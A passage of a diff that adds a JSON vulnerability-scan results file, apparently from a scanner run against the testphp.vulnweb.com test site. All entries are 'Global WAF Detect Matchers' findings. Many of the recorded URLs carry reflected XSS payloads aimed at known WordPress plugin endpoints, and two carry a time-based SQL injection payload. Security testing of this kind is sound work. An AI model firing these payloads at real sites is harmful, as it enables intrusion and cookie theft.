+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/shortcode-ninja/preview-shortcode-external.php?pp=12&shortcode=shortcode%27%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3e",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/shortcode-ninja/preview-shortcode-external.php?p=valid&pp=12&shortcode=shortcode%27%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3e",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/?pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/swipehq-payment-gateway-woocommerce/test-plugin.php?pp=12&api_url=api_url%27%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E+",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/ultimate-weather-plugin/readme.txt?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/ultimate-weather-plugin/readme.txt?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/ultimate-weather-plugin/magpierss/scripts/magpie_debug.php?pp=12&url=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/ultimate-weather-plugin/magpierss/scripts/magpie_debug.php?p=valid&pp=12&url=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/activehelper-livehelp/server/offline.php?p=valid&pp=12&MESSAGE=MESSAGE%3C%2Ftextarea%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&DOMAINID=DOMAINID&COMPLETE=COMPLETE&TITLE=TITLE&URL=URL&COMPANY=COMPANY&SERVER=SERVER&PHONE=PHONE&SECURITY=SECURITY&BCC=BCC&EMAIL=EMAIL%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&NAME=NAME%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins//wp-planet/readme.txt?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/swipehq-payment-gateway-woocommerce/test-plugin.php?p=valid&pp=12&api_url=api_url%27%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E+",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins//wp-planet/readme.txt?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/wp-planet/rss.class/scripts/magpie_debug.php?p=valid&p=valid&pp=12&pp=12&url=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/wp-planet/rss.class/scripts/magpie_debug.php?pp=12&pp=12&url=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/sexy-contact-form/includes/fileupload/files/wyP6yq.php?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/sexy-contact-form/includes/fileupload/files/wyP6yq.php?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/dzs-videogallery/readme?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/dzs-videogallery/readme?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/dzs-videogallery/deploy/designer/preview.php?pp=12&swfloc=%22%3E%3Cscript%3Ealert(1)%3C/script%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/dzs-videogallery/deploy/designer/preview.php?p=valid&pp=12&swfloc=%22%3E%3Cscript%3Ealert(1)%3C/script%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/webadmin/auth/verification.php?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/webadmin/auth/verification.php?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-admin/admin-ajax.php?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-admin/admin-ajax.php?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/revslider/temp/update_extract/lKue9.php?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/revslider/temp/update_extract/lKue9.php?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/website/blog/?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/website/blog/?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-admin/admin-ajax.php?pp=12&pp=12&action=ays_sccp_results_export_file&sccp_id[]=1)+AND+(SELECT+1183+FROM+(SELECT(SLEEP(6)))UPad)+AND+(9752=9752&type=json",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-admin/admin-ajax.php?p=valid&p=valid&pp=12&pp=12&action=ays_sccp_results_export_file&sccp_id[]=1)+AND+(SELECT+1183+FROM+(SELECT(SLEEP(6)))UPad)+AND+(9752=9752&type=json",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/navis-documentcloud/readme.txt?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/navis-documentcloud/readme.txt?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/navis-documentcloud/js/window.php?p=valid&pp=12&wpbase=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/church-admin/readme.txt?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/church-admin/readme.txt?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/?pp=12&pp=12&gf_page=upload",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/?p=valid&p=valid&pp=12&pp=12&gf_page=upload",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/church-admin/includes/validate.php?pp=12&id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/?pp=12&pp=12&gf_page=upload",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/church-admin/includes/validate.php?p=valid&pp=12&id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/?p=valid&p=valid&pp=12&pp=12&gf_page=upload",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/login?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/login?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/_snapshot/test?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/_snapshot/test?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/_snapshot/test2?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/sourceafrica/readme.txt?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/_snapshot/test2?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/sourceafrica/readme.txt?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/sourceafrica/js/window.php?pp=12&wpbase=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/sourceafrica/js/window.php?p=valid&pp=12&wpbase=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/cgibin/webproc?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/cgibin/webproc?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-login.php?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-login.php?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/navis-documentcloud/js/window.php?pp=12&wpbase=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/wp-symposium/readme.txt?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/wp-symposium/readme.txt?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/wp-symposium/get_album_item.php?p=valid&pp=12&size=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/wp-symposium/get_album_item.php?pp=12&size=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        }
+    ],
+    "zap_results": null,
+    "verifications": []
+}
